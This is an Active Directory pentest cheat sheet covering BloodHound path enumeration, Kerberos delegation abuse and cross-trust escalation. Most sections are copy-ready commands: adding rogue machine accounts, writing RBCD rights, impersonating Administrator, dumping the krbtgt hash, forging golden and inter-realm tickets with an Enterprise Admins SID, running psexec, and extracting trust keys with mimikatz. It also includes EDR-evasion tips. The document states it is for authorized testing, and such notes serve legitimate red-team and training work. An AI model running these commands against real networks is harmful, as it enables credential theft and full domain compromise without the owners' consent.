# AD Attack Path Enumeration, Delegation Abuse & Cross-Trust Attacks

*Complements notes/ad-coercion-and-relay.md (coercion+relay chains) and notes/adcs-certipy-cheatsheet.md (ADCS/ESC abuse). For authorized AD pentesting only.*

---

## 1. BloodHound CE — Attack Path Enumeration

BloodHound CE (Docker/Postgres/Neo4j rewrite) ingests collector data and runs Cypher queries to find shortest paths to Domain Admin, Kerberoastable users, ADCS abuse edges, etc.

```bash
# Windows collector (SharpHound) — routinely flagged by EDR; consider the Linux ingestor instead
SharpHound.exe --CollectionMethods All --Domain domain.local
SharpHound.exe --CollectionMethods DCOnly --Domain domain.local     # stealthier, DC-only, no member-host traffic
SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 02:00:00   # session-based paths over time

# Linux ingestor (preferred on OSCP boxes without Windows access, generally stealthier)
bloodhound-python -c DCOnly -u user01 -p 'password' -d domain.local -ns <DC_IP> --zip
```
**Reference:** https://github.com/SpecterOps/BloodHound · https://github.com/dirkjanm/BloodHound.py

### Analysis — attack paths from collected data
After ingesting data in the BloodHound CE GUI, mark compromised principals as **Owned** (right-click → "Mark as Owned") so path queries can start from them, then use:
- **Built-in queries:** "Shortest Path to Domain Admins", "Shortest Paths from Owned Objects", "Shortest Paths to Unconstrained Delegation Systems", "Find Kerberoastable Users", "Find AS-REP Roastable Users".
- **Key abusable ACL edges to look for on the path:** `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `Owns`, `ForceChangePassword`, `AddMember`, `AddSelf`, `ReadGMSAPassword`, `AllowedToDelegate`, `AllowedToAct` (RBCD), `DCSync` (needs both `GetChanges` + `GetChangesAll`).
- **Example Cypher** — shortest paths from any owned principal to Domain Admins:
```cypher
MATCH p=shortestPath((n {owned:true})-[r:MemberOf|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AddMember|AllowedToDelegate|AllowedToAct*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
RETURN p
```

---

## 2. Kerberos Delegation Abuse

### Unconstrained delegation
Find via BloodHound/`findDelegation.py`. Capture TGTs of anyone authenticating to a compromised unconstrained-delegation host (e.g. via coercion of a DC against that host, then capture with Rubeus/mimikatz on Windows, or monitor via Impacket).
```bash
impacket-findDelegation -dc-ip <DC_IP> DOMAIN/USER:PASSWORD   # enumerate all delegation types (credentials go in the positional target, no -u/-p/-d flags)
```
**Faster (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD --trusted-for-delegation` lists delegation-trusted accounts directly.

### Constrained delegation with protocol transition (S4U2Self + S4U2Proxy)
```bash
getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/svcaccount:password
```

### Constrained delegation WITHOUT protocol transition
Identify which case applies before choosing an approach:
- **Protocol transition (above)** — `svcaccount`'s `userAccountControl` has `TRUSTED_TO_AUTH_FOR_DELEGATION` set (BloodHound: delegation edge shows "with protocol transition"); `msDS-AllowedToDelegateTo` lists the allowed SPNs. S4U2Self works with just the service account's own credentials, so `-impersonate` succeeds outright.
- **Without protocol transition** — `msDS-AllowedToDelegateTo` is set but `TRUSTED_TO_AUTH_FOR_DELEGATION` is NOT. S4U2Self is unavailable for arbitrary impersonation; `getST.py -impersonate` will fail unless you already hold the victim's own TGT (S4U2Self via a real TGT still functions, then S4U2Proxy chains from it). In that case, obtain the victim's TGT first (`getTGT.py` with their creds/hash, or extract via mimikatz), then request the referral service ticket:
```bash
getTGT.py domain.local/victimuser:password
KRB5CCNAME=victimuser.ccache getST.py -spn cifs/target.domain.local -impersonate victimuser domain.local/svcaccount:password
```

### RBCD (Resource-Based Constrained Delegation)
```bash
# 1. Add a rogue computer (any authenticated user can add up to ms-DS-MachineAccountQuota, default 10)
impacket-addcomputer -computer-name 'ATTACKERPC$' -computer-pass 'Passw0rd!' -dc-ip <DC_IP> domain.local/user:password

# 2. Grant RBCD rights on the target
rbcd.py -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write -dc-ip <DC_IP> domain.local/user:password

# 3. Request a service ticket impersonating a privileged user
getST.py -spn cifs/target.domain.local -impersonate Administrator -dc-ip <DC_IP> domain.local/ATTACKERPC$:'Passw0rd!'

# 4. Use the ticket
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass -target-ip <TARGET_IP> target.domain.local/Administrator@target.domain.local
```
**Reference:** https://www.thehacker.recipes/ad/movement/kerberos/delegations/ · https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-3/

---

## 3. Cross-Trust Attacks

Two paths to cross a parent/child or forest trust boundary once you own a DC on one side.

### ExtraSIDs / Golden Ticket with SID History (intra-forest, SID filtering not enforced)
```bash
# Dump krbtgt hash of the child domain
secretsdump.py child.domain.local/Administrator:password@CHILD_DC_IP -just-dc-user krbtgt
# Faster (nxc): nxc smb CHILD_DC_IP -u Administrator -p password --ntds --user krbtgt   # pulls just the krbtgt hash via DRSUAPI

# Forge a TGT injecting the parent's Enterprise Admins SID
ticketer.py -nthash <krbtgt_NTHASH> -domain-sid <CHILD_DOMAIN_SID> -domain child.domain.local -extra-sid <PARENT_DOMAIN_SID>-519 Administrator

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass child.domain.local/Administrator@PARENT_DC_FQDN

# Automated end-to-end equivalent:
raiseChild.py -target-exec <PARENT_DC_IP> CHILDFQDN/user:password
```

### Trust key extraction + inter-realm TGT forgery (works even with SID filtering)
```
# Mimikatz — dump the trust account key (elevated on either DC, or via DCSync of the trust account)
lsadump::trust /patch
```
Then forge an inter-realm TGT with Impacket's `ticketer.py` using the extracted trust key, and request cross-realm TGS via `getST.py` against the trusting domain's DC.

**SID filtering caveat:** forest trusts enforce SID filtering by default (RID<1000 and foreign SIDs stripped), blocking the ExtraSIDs path across forests — trust-key forgery or SID-History on quarantine-disabled trusts is the fallback.

**Reference:** https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/ · https://adsecurity.org/?p=1588 · https://github.com/fortra/impacket/blob/master/examples/raiseChild.py

---

## Tools Reference

| Tool | URL |
|---|---|
| BloodHound CE | https://github.com/SpecterOps/BloodHound |
| BloodHound.py (Linux ingestor) | https://github.com/dirkjanm/BloodHound.py |
| Impacket (ticketer.py, getST.py, addcomputer.py, rbcd.py, findDelegation.py, raiseChild.py) | https://github.com/fortra/impacket |
| Rubeus (Windows) | https://github.com/GhostPack/Rubeus |
| Mimikatz | https://github.com/gentilkiwi/mimikatz |
| PowerView | https://github.com/PowerShellMafia/PowerSploit |
